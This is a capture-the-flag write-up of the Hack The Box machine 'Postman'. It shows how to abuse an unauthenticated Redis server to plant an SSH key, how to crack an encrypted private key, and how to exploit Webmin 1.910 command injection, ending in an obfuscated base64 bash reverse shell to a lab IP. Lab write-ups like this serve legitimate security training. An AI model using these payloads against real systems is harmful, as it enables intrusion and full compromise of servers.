---
layout: single
title: Postman - Hack The Box
excerpt: "Postman is an easy difficult Linux machine, which features a Redis server running without authentication. This service can be leveraged to write a SSH public key to the User's folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of webmin. This is exploited through command injection to gain root privileges."
date: 2020-03-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-postman/postman_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Redis
  - Command Injection
  - Webmin
  - Enumeration
---

![](/assets/images/htb-writeup-postman/postman_logo.png)

## Synopsis
Postman is an easy difficult Linux machine, which features a Redis server running without authentication. This service can be leveraged to write a SSH public key to the User's folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of webmin. This is exploited through command injection to gain root privileges.

## Skills Required
* Enumeration

## Skills Learned
* Redis exploitation
* Webmin Command Injection
 
---
## Enumeration
### Nmap
```java
nmap -Pn -v -sC -sV -p 22,80,6379,10000 -o full.nmap 10.10.10.160
Nmap scan report for postman (10.10.10.160)
Host is up (0.28s latency).
rDNS record for 10.10.10.160: postman.htb

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (EdDSA)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.910
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH adn Apache are running on their usual ports. Additionally, a `Reids 4.0.9` instance also found. port `100000` hosts Webmin running on `MiniServ 1.910`.

## Redis
Redis versions between 4.0 and 5.0 are vulnerable to unauthenticated command executionand file writes. Detailed information on this vulnerability can be found in this [presentation.](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf) Let's check if the server is vulnerable using `redis-cli`.

```
redis-cli -h 10.10.10.160
10.10.10.160:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "cluster-announce-ip"
  8) ""
  9) "unixsocket"
 10) ""
 11) "logfile"
 12) "/var/log/redis/redis-server.log"
 13) "pidfile"
 14) "/var/run/redis/redis-server.pid"
 15) "slave-announce-ip"
 <SNIP>
```
We were able to connect and query the configuration, which reveals that it's possible to operate without authentication.
Looking at the config, we find the default folder to be `var/lib/redis`. Let's check if the `redis` user has SSH authentication configured by checking for the existance of `.ssh` folder
```
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379> CONFIG SET dir /var/lib/redis/blah
(error) ERR Changing directory: No such file or directory
10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
```
In the above output, the server returned an error when we try setting a non-existent directory. but returned `OK` on setting dir to `.ssh` folder. Having confirmed the existance of the `.ssh` folder, we can proceed write our SSH public key to it. First, create a file named `key.txt` with the SSH public key in it.
```
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
```
Next, set the file contents as a key in redis.
```
cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
OK
```
Save this key into the `/var/lib/redis/.ssh/authorized_keys` file.
```
redis-cli -h 10.10.10.160
10.10.10.160:6379> GET ssh_key
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCnPll<SNIP>Xo9iT3 mah1ndra@ubuntu\n\n\n\n"
(0.71s)
10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> exit
```
In the above output, the key named `ssh_key` is saved into the `authorized_keys` file. we can now SSH into the server as `redis` user.

![](/assets/images/htb-writeup-postman/initial.png)

## Lateral Movement
The [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) enumerate script can be used to enumerate the box furtther. Download the script and transfer it to the box using `scp`.
```
scp linpeas.sh redis@10.10.10.160:/tmp
```
Browse to the `/tmp` folder and execute the script.
```
redis@Postman:/tmp$ chmod +x linpeas.sh
redis@Postman:/tmp$ ./linpeas.sh
```
![](/assets/images/htb-writeup-postman/bak.png)

The script identified an `id_rsa.bak` file in the `/opt/` folder.
```
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```
The key is found to be encrypted. Copy the key locally, so we can attempt to crack it offline using `john the Ripper`. The `ssh2john` script can be used to generate a hash of the key.
```
ssh2john.py id_rsa.bak > hash
cat hash
id_rsa.bak:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
```
![](/assets/images/htb-writeup-postman/crack.png)

The offline brute force attack was successful, and the password is revealed to be `computer2008`. The other user on the box with valid shell `Matt`. Trying to use this SSH Key to login fails. However, we can `su` to switch user.

```
redis@Postman:/opt$ su Matt
Password:
Matt@Postman:/opt$ cd ~
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ wc -c user.txt
33 user.txt
```


## Privilege Escalation
Enumeration as this user doesn't yiedl any interesting output. Let's try logging in to webmin with his credentials.

![](/assets/images/htb-writeup-postman/webmin.png)

The login was successful giving us low privileged access to the application. The version of the webmin server can be found by looking at the `/etc/webmin/version` .
```
Matt@Postman:/etc/webmin$ cat version 
1.910
```
Searching for vulnerabilities in this version, we come across this [POC](https://github.com/Dog9w23/Webmin-1.910-Exploit). The package update is vulnerable to command injection through `u` `POST` parameter. Click on `System` on the panel to the left, then click on  `Software Package Updates`. Turn on `Burp` intercept and click on `Update Select Packages`.

![](/assets/images/htb-writeup-postman/updatepackage.png)

A request to `/package-updates/update.cgi` should be intercepted, send it to `Burp` Repeater and remove all the parameters. Add the following payload to the end of the request.
```
u=acl%2Fapt&u=$(whoami)
```
This should execute the `whoami` before the apt update command. Once the page returns, scroll to the bottom  to look at the output.

![](/assets/images/htb-writeup-postman/burp.png)

It's seen that the server tried to install a package name `root`, which was the output of `whoami`.
Similarly, a bash reverse shell can be executed

```
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDQ0IDA+JjEi
```

The final payload will be:
```
$(echo${IFS}YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDQ0IDA+JjEi|base64${IFS}-d|bash)
```
The `IFS` variable is used instead of spaces, in order to avoid the server from splitting the command. Add this to the `u` parameter and URL encode it. Next, start a listener on port `4444` and forward the request on `Burp`.

![](/assets/images/htb-writeup-postman/burppayload.png)

A shell as root should be received.

![](/assets/images/htb-writeup-postman/root.png)


